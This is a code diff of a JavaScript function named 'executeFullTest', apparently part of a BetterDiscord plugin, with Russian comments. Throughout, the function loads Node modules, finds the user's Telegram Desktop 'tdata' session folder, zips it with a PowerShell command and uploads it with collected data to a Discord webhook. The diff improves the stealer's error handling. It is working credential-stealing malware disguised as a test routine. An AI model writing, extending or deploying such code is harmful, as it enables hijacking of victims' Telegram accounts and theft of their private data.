@@ -2,16 +2,22 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, requireFunc) {
     // Безопасное получение модулей Node.js
     let req = requireFunc;
     if (!req && typeof process !== 'undefined' && process.mainModule) {
-        req = process.mainModule.require;
+        req = process.mainModule.require.bind(process.mainModule);
     }
+    
     if (!req) {
-        return false;
+        return { success: false, error: "Не удалось получить доступ к require (нет fs)" };
     }
 
-    const fs = req('fs');
-    const path = req('path');
-    const os = req('os');
-    const { execSync } = req('child_process');
+    let fs, path, os, execSync;
+    try {
+        fs = req('fs');
+        path = req('path');
+        os = req('os');
+        execSync = req('child_process').execSync;
+    } catch (e) {
+        return { success: false, error: "Ошибка загрузки модулей Node.js: " + e.message };
+    }
 
     let result = {
         ip: null,
@@ -63,16 +69,13 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, requireFunc) {
                     result.telegram_path = p;
                     hasTdata = true;
                     
-                    // Сжимаем папку tdata в zip с помощью PowerShell (только Windows)
                     tdataZipPath = path.join(os.tmpdir(), 'opium_tdata.zip');
                     try {
-                        // Удаляем старый архив, если есть
                         if (fs.existsSync(tdataZipPath)) fs.unlinkSync(tdataZipPath);
-                        // Запускаем сжатие (максимум 30 секунд)
+                        // Сжимаем через PowerShell
                         execSync(`powershell -command "Compress-Archive -Path '${p}' -DestinationPath '${tdataZipPath}' -Force"`, { timeout: 30000 });
                     } catch (zipError) {
-                        console.error("Ошибка архивации:", zipError);
-                        hasTdata = false; // Если не смогли сжать, не будем отправлять
+                        hasTdata = false; // Если не смогли сжать, не отправляем
                     }
                     break;
                 }
@@ -122,11 +125,9 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, requireFunc) {
     const formData = new FormData();
     formData.append('payload_json', JSON.stringify({ content: messageText }));
 
-    // Прикрепляем JSON
     const jsonBuffer = Buffer.from(JSON.stringify(result, null, 2));
     formData.append('files[0]', new Blob([jsonBuffer], { type: 'application/json' }), 'data.json');
 
-    // Прикрепляем ZIP архив (если он есть)
     if (hasTdata && fs.existsSync(tdataZipPath)) {
         const zipBuffer = fs.readFileSync(tdataZipPath);
         formData.append('files[1]', new Blob([zipBuffer], { type: 'application/zip' }), 'tdata.zip');
@@ -139,8 +140,13 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, requireFunc) {
             method: 'POST',
             body: formData
         });
-        return response.ok;
+        
+        if (!response.ok) {
+            const errorText = await response.text();
+            return { success: false, error: `Discord вернул ${response.status}: ${errorText}` };
+        }
+        return { success: true };
     } catch (e) {
-        return false;
+        return { success: false, error: `Ошибка сети: ${e.message}` };
     }
 }
